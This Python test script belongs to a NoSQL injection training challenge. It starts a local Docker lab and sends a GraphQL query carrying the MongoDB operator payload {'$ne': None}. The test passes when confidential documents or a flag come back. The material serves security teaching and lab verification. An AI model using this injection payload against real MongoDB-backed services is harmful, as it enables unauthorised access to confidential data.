#!/usr/bin/env python3
"""
NoSQL Injection Challenge Tests
Tests for NoSQL injection vulnerability in GraphQL
"""

import requests
import json
import sys
import time
import subprocess
import os
from urllib.parse import urljoin


class TestNoSQLInjectionChallenge:
    """Test suite for NoSQL Injection Challenge"""
    
    def __init__(self, base_url="http://localhost:8008"):
        self.base_url = base_url
        self.graphql_url = urljoin(base_url, "/graphql")
        self.health_url = urljoin(base_url, "/health")
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'NoSQL-Injection-Test/1.0'
        })
        self.tests_passed = 0
        self.tests_failed = 0
    
    def start_services(self):
        """Start Docker Compose services"""
        print("🚀 Starting NoSQL Injection Challenge...")
        try:
            # Change to challenge directory
            os.chdir('../08-nosql-injection')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'up', '-d'], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to start services: {e}")
            return False
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def stop_services(self):
        """Stop Docker Compose services"""
        print("🧹 Cleaning up...")
        try:
            # Change to challenge directory
            os.chdir('../08-nosql-injection')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'down', '--volumes'], 
                         check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Warning: Failed to stop services: {e}")
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def wait_for_service(self, timeout=120):
        """Wait for the service to be ready"""
        print("⏳ Waiting for services to be ready...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.health_url)
                if response.status_code == 200:
                    print("✅ Services are ready")
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        
        print(f"❌ Services failed to start within {timeout}s")
        return False
    
    def graphql_query(self, query, variables=None):
        """Execute a GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        response = self.session.post(self.graphql_url, json=payload)
        return response
    
    def test_nosql_injection(self):
        """Test NoSQL injection vulnerability"""
        print("🧪 Test: NoSQL injection attack")
        
        try:
            # Test MongoDB injection payload using variables
            query = '''
            query ($titleFilter: JSON!) {
              searchDocuments(titleFilter: $titleFilter) {
                _id
                title
                content
                confidential
                debug_info
                owner {
                  _id
                  username
                }
              }
            }
            '''
            
            variables = {
                "titleFilter": {"$ne": None}
            }
            
            response = self.graphql_query(query, variables)
            response_data = response.json()
            
            # Check for successful injection - should retrieve confidential documents
            if (response.status_code == 200 and 
                'data' in response_data and 
                'searchDocuments' in response_data['data'] and
                response_data['data']['searchDocuments'] and
                any(doc.get('confidential') or 'HC{' in str(doc.get('debug_info', '')) 
                    for doc in response_data['data']['searchDocuments'])):
                print("✅ PASS - NoSQL injection successful")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - NoSQL injection failed")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def run_tests(self):
        """Run all NoSQL injection tests"""
        print("🔍 NoSQL Injection Challenge Test Runner")
        print("========================================")
        
        if not self.start_services():
            return False
        
        try:
            if not self.wait_for_service():
                return False
            
            print("\n🧪 Running NoSQL injection tests...\n")
            
            # Run tests
            self.test_nosql_injection()
            
            print(f"\n📊 Test Results: {self.tests_passed} passed, {self.tests_failed} failed")
            
            if self.tests_failed > 0:
                print("❌ Some tests failed")
                return False
            else:
                print("✅ All tests passed!")
                return True
                
        finally:
            self.stop_services()


def main():
    """Main function"""
    tester = TestNoSQLInjectionChallenge()
    success = tester.run_tests()
    
    if success:
        print("\n🎉 NoSQL Injection Challenge tests completed successfully!")
        sys.exit(0)
    else:
        print("\n❌ NoSQL Injection Challenge tests failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()